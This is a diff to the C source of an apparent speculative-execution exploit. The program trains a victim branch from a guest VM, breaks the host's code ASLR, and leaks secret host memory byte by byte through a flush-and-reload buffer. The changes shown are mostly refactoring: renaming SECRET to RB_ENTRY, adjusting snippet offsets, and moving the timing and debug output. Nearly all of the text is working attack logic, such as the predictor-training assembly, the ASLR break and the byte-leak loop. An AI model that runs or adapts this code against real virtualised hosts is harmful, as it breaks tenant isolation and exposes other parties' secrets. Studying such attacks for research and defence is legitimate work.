@@ -9,7 +9,6 @@
 #include <unistd.h>
 
 #define CACHE_MISS_THRES 300
-#define SECRET           0
 #define RB_OFFSET        0x10cc0
 #define RB_SLOTS         8
 #include "compiler.h"
@@ -29,10 +28,10 @@ uint64_t break_code_aslr(uint64_t *);
 #define PG_ROUND(n) (((((n) - 1UL) >> 12) + 1) << 12)
 
 // #define NO_MMIO
-// #define DEBUG_LEAK
-// #define DEBUG_RESOLVE
 // #define DEBUG_HIT
 // #define DEBUG_RB
+// #define DEBUG_LEAK
+// #define DEBUG_RESOLVE
 // #define DEMO
 #define AUTOMATIC_KEY_SELECTION
 
@@ -58,7 +57,8 @@ uint64_t break_code_aslr(uint64_t *);
 #define QEMU_MAGIC_SECRET_OBJECT -1
 #endif
 
-#define ROUNDS 4
+#define ROUNDS   4
+#define RB_ENTRY 0
 
 extern char psnip_src_call_label[];
 extern char psnip_src_entry_label[];
@@ -80,22 +80,22 @@ uarf_psnip_declare_define(psnip_src,
     "step2:\n\t"
     "test %ebx,%ebx\n\t"        // 0x555555e8bed0
     "je step1\n\t"              // 0x555555e8bed2
-    ".skip 0x47c\n\t"
+    ".skip 0x7eac\n\t"
 
-    "psnip_src_entry_label:\n\t"// 0x555555de5140 <--- entrypoint of this snippet
-    ".fill 0x48, 0x1, 0x90\n\t"
+    "psnip_src_entry_label:\n\t"// 0x555555e93d80 <--- entrypoint of this snippet
+    ".fill 0x4c, 0x1, 0x90\n\t"
     "test %ebx,%ebx\n\t"        // 0x555555de5188
-    "je step5\n"                // 0x555555de518a
+    "je step5\n"                // 0x555555e93dce
     ".fill 0x3, 0x1, 0x90\n\t"
 
-    "step4:\n\t"                // 0x555555de5193
-    ".fill 0x81, 0x1, 0x90\n\t"
-    "call *%rcx\n\t"            // 0x555555de5214
-    ".fill 0x3a, 0x1, 0x90\n\t"
+    "step4:\n\t"                // 0x555555e93dd7
+    ".fill 0x84, 0x1, 0x90\n\t"
+    "call *%rcx\n\t"            // 0x555555e93e5b
+    ".fill 0x43, 0x1, 0x90\n\t"
     
-    "step5:\n\t"                // 0x555555de5250
+    "step5:\n\t"                // 0x555555e93ea0
     ".fill 0x4c, 0x1, 0x90\n\t"
-    "jmp step4\n\t"             // 0x555555de529c
+    "jmp step4\n\t"             // 0x555555e93eec
 );
 // clang-format on
 
@@ -110,7 +110,6 @@ uarf_psnip_declare_define(psnip_victim_dst,
 uarf_psnip_declare_define(psnip_train_stage_1, 
     ".fill 0x8, 0x1, 0x90\n\t"
     "call *0x10(%rax)\n\t"
-    // "ret\n\t"
 );
 // clang-format on
 
@@ -347,14 +346,12 @@ uint8_t attack_loop(actxt_t *actxt, uint64_t rounds, uint64_t thresh,
 
         // Train victim -> disclosure gadget using HVA
         {
-            register uint64_t rb_val asm("r12") = _ul(dummy_val);
             asm volatile(""
-                         "call *%5\n\t"
+                         "call *%3\n\t"
                          :
-                         : "d"(rb_val), "a"(dst_train_ptr), "b"(0),
-                           "c"(actxt->extra_call), "r"(rb_val), "r"(actxt->entry_point)
+                         : "a"(dst_train_ptr), "b"(0), "c"(actxt->extra_call),
+                           "r"(actxt->entry_point)
                          : "r8", "memory");
-            asm volatile("" ::: "rcx", "rdi", "rsi");
         }
 
         rb_flush();
@@ -382,7 +379,10 @@ uint8_t attack_loop(actxt_t *actxt, uint64_t rounds, uint64_t thresh,
     }
 
     if (rb_hist[rb_slot] > thresh) {
-        // printf("\nrb: %s, [%u]: %lu\n", gen_rb_heat(), SECRET, rb_hist[SECRET]);
+
+#ifdef DEBUG_RB
+        printf("\nrb: %s, [%u]: %lu\n", gen_rb_heat(), RB_ENTRY, rb_hist[RB_ENTRY]);
+#endif
         return 1;
     }
 
@@ -391,7 +391,7 @@ uint8_t attack_loop(actxt_t *actxt, uint64_t rounds, uint64_t thresh,
 
 uint8_t check_byte_thresh(actxt_t *actxt, uint64_t secret_ptr, uint64_t rounds,
                           uint64_t thresh) {
-    int64_t memory_offset = (SECRET * RB_STRIDE - (GADGET_OFFSET_2 - RB_OFFSET));
+    int64_t memory_offset = (RB_ENTRY * RB_STRIDE - (GADGET_OFFSET_2 - RB_OFFSET));
     uint64_t attack_ptr_gva = RB_PTR + memory_offset + actxt->rb_offset;
     uint64_t attack_ptr_hva = actxt->rb_hva + memory_offset + actxt->rb_offset;
 
@@ -403,7 +403,7 @@ uint8_t check_byte_thresh(actxt_t *actxt, uint64_t secret_ptr, uint64_t rounds,
         secret_ptr - GADGET_OFFSET_1;
 
     return attack_loop(actxt, rounds, thresh, attack_ptr_gva + GADGET_OFFSET_0,
-                       attack_ptr_hva, SECRET);
+                       attack_ptr_hva, RB_ENTRY);
 }
 
 uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
@@ -481,7 +481,7 @@ uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
     uint8_t start_byte = ((chain_start + (256 + 55 - DOWN_EXTEND)) % 256);
     *byte = start_byte;
 #ifdef DEBUG_LEAK
-    uint8_t end_byte = ((chain_end + (256 + -13 - DOWN_EXTEND)) % 256);
+    uint8_t end_byte = ((chain_end + (256 + -12 - DOWN_EXTEND)) % 256);
     if (start_byte != end_byte) {
         printf("disagreement: %u != %u\n", start_byte, end_byte);
     }
@@ -718,9 +718,13 @@ int main(int argc, char const *argv[]) {
            ((double) (end_initialize - start_initialize)) / CLOCKS_PER_SEC);
 #endif
 
+    printf("\n");
+    printf("### break code ASLR ###");
+    clock_t start_aslr = clock();
     uint64_t call_offset = ((uint64_t) psnip_src_call_label) - psnip_src.addr;
     uint64_t aslr_offset = 0;
     if (argc > 1) {
+        printf("\nusing provided victim location\n");
         uint64_t aslr_addr;
         if (sscanf(argv[1], "0x%lx\n", &aslr_addr) < 0) {
             err(1, "sscanf");
@@ -729,9 +733,6 @@ int main(int argc, char const *argv[]) {
     }
     else {
         // we can try multiple times
-        printf("\n");
-        printf("### break code ASLR ###");
-        clock_t start_aslr = clock();
         uint8_t res = 0;
         for (int retry = 0; retry < 4 && !(res = break_code_aslr(&aslr_offset)); ++retry)
             ;
@@ -739,13 +740,12 @@ int main(int argc, char const *argv[]) {
             UARF_LOG_ERROR("failed to break code ASLR!\n");
             return 1;
         }
-        clock_t end_aslr = clock();
-        printf("victim at 0x%012lx\n", HVA_SRC + aslr_offset);
-#ifndef DEMO
-        printf("code_aslr time = %fs\n",
-               ((double) (end_aslr - start_aslr)) / CLOCKS_PER_SEC);
-#endif
     }
+    printf("victim at 0x%012lx\n", HVA_SRC + aslr_offset);
+    clock_t end_aslr = clock();
+#ifndef DEMO
+    printf("code_aslr time = %fs\n", ((double) (end_aslr - start_aslr)) / CLOCKS_PER_SEC);
+#endif
     uint64_t rb_hint = 0;
     if (argc > 2) {
         if (sscanf(argv[2], "0x%lx\n", &rb_hint) < 0) {
@@ -814,7 +814,7 @@ int main(int argc, char const *argv[]) {
         rb_flush();
         uarf_mfence();
         // Value gets passed to RDX register of victim branch
-        uint8_t *reload_ptr = _ptr(RB_PTR + RB_OFFSET + SECRET * RB_STRIDE);
+        uint8_t *reload_ptr = _ptr(RB_PTR + RB_OFFSET + RB_ENTRY * RB_STRIDE);
 
         asm volatile("victim_label:\n"
                      "clflush (%1)\n\t"
@@ -833,7 +833,7 @@ int main(int argc, char const *argv[]) {
 #ifdef DEBUG_HIT
     printf("rb: %s, [%lu]: %lu\n", gen_rb_heat(), maxi, rb_hist[maxi]);
 #endif
-    if (maxi != SECRET || rb_hist[SECRET] < ROUNDS / 2) {
+    if (maxi != RB_ENTRY || rb_hist[RB_ENTRY] < ROUNDS / 2) {
         UARF_LOG_ERROR("not hitting it right\n");
         return 1;
     }
@@ -865,9 +865,9 @@ int main(int argc, char const *argv[]) {
             fflush(stdout);
         }
         if (attack_loop(&ctxt, ROUNDS, 1, 0, rb_hva_test + RB_OFFSET - GADGET_OFFSET_0,
-                        SECRET) |
+                        RB_ENTRY) |
             attack_loop(&ctxt, ROUNDS, 1, 0, rb_hva_test + RB_OFFSET - GADGET_OFFSET_0,
-                        SECRET)) {
+                        RB_ENTRY)) {
             rb_hva = rb_hva_test;
             printf("\nbuffer at 0x%012lx", rb_hva);
             break;
@@ -938,35 +938,29 @@ int main(int argc, char const *argv[]) {
 
 #ifdef DEBUG_LEAK
     printf("leak bytes for secret=0-256:\n");
-    for (int s = 0; s < 256; ++s) {
-        *(volatile uint64_t *) (secret_ptr_gva) = s;
-        uint8_t byte;
-        leak_byte(&ctxt, secret_ptr_hva, &byte);
-        printf("s: %d - %u (%s)\n", s, byte, s == byte ? "ok" : "BAD");
-    }
-
     int success = 0;
     int kinda_success = 0;
-    for (uint8_t i = 0; i < 256; ++i) {
-        *(volatile uint8_t *) (secret_ptr_gva) = i;
+    for (uint8_t s = 0; s < 256; ++s) {
+        *(volatile uint8_t *) (secret_ptr_gva) = s;
         uarf_mfence();
 
         uint8_t res;
         if (!leak_byte(&ctxt, secret_ptr_hva, &res))
             printf("failed\n");
-        if (res == i) {
+        if (res == s) {
             success += 1;
         }
         else {
-            if (res >> 3 == i >> 3) {
-                printf("small-bad: %d - %d\n", i, res);
+            if (res >> 3 == s >> 3) {
+                printf("small-bad: %d - %d\n", s, res);
                 kinda_success += 1;
             }
             else {
-                printf("big-bad: %d - %d\n", i, res);
+                printf("big-bad: %d - %d\n", s, res);
             }
         }
-        if (i == 255)
+        printf("s: %d - %u (%s)\n", s, res, s == res ? "ok" : "BAD");
+        if (s == 255)
             break;
     }
     printf("success count = %d\n", success);
